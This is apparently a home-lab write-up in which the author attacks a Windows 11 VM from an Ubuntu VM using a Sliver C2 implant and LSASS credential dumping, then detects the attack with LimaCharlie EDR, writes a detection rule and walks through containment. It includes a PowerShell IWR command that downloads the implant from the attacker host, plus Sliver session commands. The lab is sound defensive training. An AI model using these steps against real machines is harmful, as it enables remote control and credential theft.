# LimaCharlie-EDR-Lab
![Architecture](https://i.imgur.com/6mftsEk.jpg)

## Introduction

I simulated a real-life cyber attack scenario and tested the effectiveness of my security measures. I created two virtual machines on a NatNetwork: an Ubuntu Server acting as the attacker, and a Windows 11 machine as the victim.

To enhance the security of the victim machine, I installed LimaCharlie sensor and Sysmon, which helped me detect any potential attacks or security events. On the Ubuntu Server, I installed [Sliver-Server C2](https://bishopfox.com/blog/sliver), a command and control attack tool. I will be conducting a Credential Gathering attack using LSASS.exe to extract usernames and passwords. 

To test my security measures, I executed the C2 attack and created detection rules to alert administrators of any suspicious activity. This lab project aimed to demonstrate the importance of having robust security measures in place to protect against cyber attacks.

The Technologies and Tools used during this project:

* Virtual Box NatNetwork
* Virtual Machines 
  + Windows 11
  + Ubuntu Server 22.04
* LimaCharlieEDR
* Silver Server 

## Labbing

After setting up the environment, the next step involved creating a Sliver-Server C2 implant on the Ubuntu server to be installed on the Windows system.


![Implant](https://i.imgur.com/LEP0qSk.png)


To facilitate the installation process, a quick web server was set up on the Ubuntu machine. This web server would host the C2 payload, allowing it to be easily accessed and downloaded by the Windows device.

On the Windows system, a PowerShell command was executed to initiate the download and save the C2 implant. The specific PowerShell command used was:

![IWR](https://i.imgur.com/dadsDeX.png)

IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]

In this command, [IpAddress] refers to the IP address of the Ubuntu machine hosting the C2 payload, [ImplantName] represents the name of the C2 implant file, and [FileLocation] indicates the desired location on the Windows system where the implant should be saved.

Once the C2 implant is successfully downloaded onto the Windows device, the next step would involve executing the malicious file. This execution grants the C2 infrastructure control over the compromised Windows system, allowing for remote access and potential malicious activities.

![Excute](https://i.imgur.com/mkdYQkp.png)

## Excuting Commands on Victum Device

Once inside the Sliver-Server session, we have the ability to run commands and gather information about the compromised device. Here are some commands that can be executed within the Sliver-Server session to identify the device:

![Session](https://i.imgur.com/4SE5ZEE.png)

Whoami - Hostname

PWD - Print Working Directory

Netstat - Network connections

ps -T - Process Tree (Sliver highlights its own files green )

![Tree](https://i.imgur.com/CfmWUyF.png)


## Inside LimaCharlie EDR

After successfully installing the malicious file, it is important to leverage the capabilities of our EDR (Endpoint Detection and Response) solution to gain visibility into the compromised system. Here's what can be done using the EDR solution:

Processes Analysis: Begin by examining the running processes on the compromised system. Look for any suspicious or unfamiliar processes. During the investigation, an unsigned file is discovered, highlighted in yellow, indicating a potentially malicious presence.
    
![process](https://i.imgur.com/Pts6px0.png)

File Location and LimaCharlie Filesystem Section: Upon identifying the suspicious process, investigate further to determine its file location. In this case, it is found within the Downloads folder of a user named "Victum." To gain more insights, access the LimaCharlie filesystem section to locate and analyze the identified file.
    
![filesystem](https://i.imgur.com/ksRCp3P.png)

Timeline Analysis: Shift focus to the timeline of events surrounding the installation of the malicious file. Explore the activities leading up to and following the installation to identify any relevant indicators of compromise (IOCs) or suspicious behavior. During this analysis, a network connection is observed, and it is found that the file of concern is named "COMPLEX_BELL."

![timeline](https://i.imgur.com/jYVSaNr.png)

Hash Analysis with VirusTotal: Proceed with gathering the hash of the suspicious file and conduct a lookup using VirusTotal, a popular online threat intelligence platform. However, when querying VirusTotal with the file's hash, no results are returned. This lack of detection suggests that the attacker likely crafted the file themselves, evading traditional signature-based antivirus detection.


## Credential Gathering

One of the critical objectives for attackers is gaining access to multiple user accounts. A common technique used to achieve this is by extracting credentials from the LSASS.exe file, which contains usernames, passwords, and security tokens.

To understand LSASS Credential Gathering in more detail, you can refer to the documentation provided by [Mitre](https://attack.mitre.org/techniques/T1003/001/).

Attackers typically run a command to copy the contents of the LSASS file and dump it onto their own host, enabling them to extract and analyze the gathered credentials.

![lsass-dump](https://i.imgur.com/1TDbDT7.png)

To detect this specific method of Credential Gathering, we can create a detection rule in LimaCharlie. The rule will be designed to identify any interaction with the LSASS file. However, it is important to note that this detection rule may generate false positives if administrators are legitimately accessing the LSASS file for administrative purposes. In a lab scenario like this, where there are no actual users, this rule is suitable for detecting the LSASS dump command.

![lsass-detection-rule](https://i.imgur.com/6bDKczs.png)


Once the detection rule is implemented in LimaCharlie, running the LSASS dump command again will trigger the detection within the LimaCharlie system. The detection event will provide visibility into the unauthorized LSASS file access, allowing security analysts to investigate and respond to the potential credential gathering activity.

![lsass-dump](https://i.imgur.com/1TDbDT7.png)


![Lima-Detections](https://i.imgur.com/mCsvF9u.png)


## Containment & Eradication

First we need to identify if this attack took place on other devices inside the network. Since this lab only has one VM we know that there is only one. Next we should isolate this device from our network to ensure that this attacker can't move around or futher attack our internal network.

![isolate](https://i.imgur.com/E3bqXh9.png)

Then we can either return to a known good snapshot if this is a Virtual Machine. We can also delete the file inside LimaCharlie by going into the filesystem section and finding the malicous file. We will also need to inspect other logs and detections to ensure that no other attacks or malware took place on this device before we put it back on the network. 

The most important part, since this attack was stealing credientials, we need to change passwords, implement MFA and maybe change usernames to ensure the attacker cannot login to other devices or accounts. 

## Conclusion



## Credit

This project was based on a blog post by [Eric Capuano](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro?sd=pf) 


